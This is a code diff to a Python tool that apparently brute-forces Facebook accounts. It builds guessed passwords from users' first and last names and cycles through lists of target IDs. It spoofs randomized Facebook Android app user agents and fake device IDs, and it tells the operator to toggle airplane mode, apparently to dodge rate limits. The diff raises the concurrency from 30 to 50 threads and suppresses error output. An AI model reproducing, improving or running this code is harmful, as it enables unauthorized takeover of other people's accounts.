@@ -1614,7 +1614,7 @@ def __FILEX__():
     for i in range(pass_lmit):
         dplist.append(input(f'{rad}[{white}🔖{rad}] {green}EXAMPLE {rad}[{white}firstlast-first@12-ETC{rad}]\n{rad}[{white}🔖{rad}] {green}PASSWORD ➡ {i+1} {white}▶︎ {yelloww}'));linex()
     __METHOD__ = input(f"{rad}[{white}A{rad}]{green} METHOD M1\n{rad}[{white}B{rad}] {green}METHOD M2 \n{rad}[{white}C{rad}] {green}METHOD M3 \n{rad}[{white}D{rad}] {green}METHOD M4\n{rad}[{white}E{rad}] {green}METHOD M5 \n{rad}[{white}F{rad}] {green}METHOD M6 \n{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{rad}[{white}🔖{rad}] {green}SELECTION {white}▶︎ {yelloww}");os.system('clear')
-    with ThreadPool(max_workers=30) as BITHIKA:
+    with ThreadPool(max_workers=50) as BITHIKA:
         ____banner____();total_ids = str(len(dx))
         print(f'{rad}[{white}🔖{rad}] {green}TOTAL IDS  {white}▶︎ \x1b[38;5;38m{total_ids}{rad} ! {green}METHOD {white}▶︎ \x1b[38;5;38m{__METHOD__}')
         print(f'{rad}[{white}🔖{green}] TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' )
@@ -1841,7 +1841,7 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
             pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
             netheni = str(random.randint(20000, 40000))
             simheni = str(random.randint(20000, 40000))
-            user_agent = DEF4()
+            user_agent =f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/336.0.0.20.117;FBBV/287214784;FBDM/{density=4.0,width=1200,height=812};FBLC/en_US;FBCR/Grameenphone;FBMF/AllView;FBBD/allview;FBPN/com.facebook.katana;FBDV/ Viva H1003 LTE;FBSV/10;FBCA/armeabi-v7a:armeabi;]",
             warna = random.choice(my_color)
             adid = str(uuid.uuid4())
             device_id = str(uuid.uuid4())
@@ -1920,10 +1920,10 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
                 continue
         loop += 1
     except pycurl.error as e:
-        print(e)
+        #print(e)
         time.sleep(10)
     except Exception as e:
-        print(e)
+        #print(e)
         pass
 
 
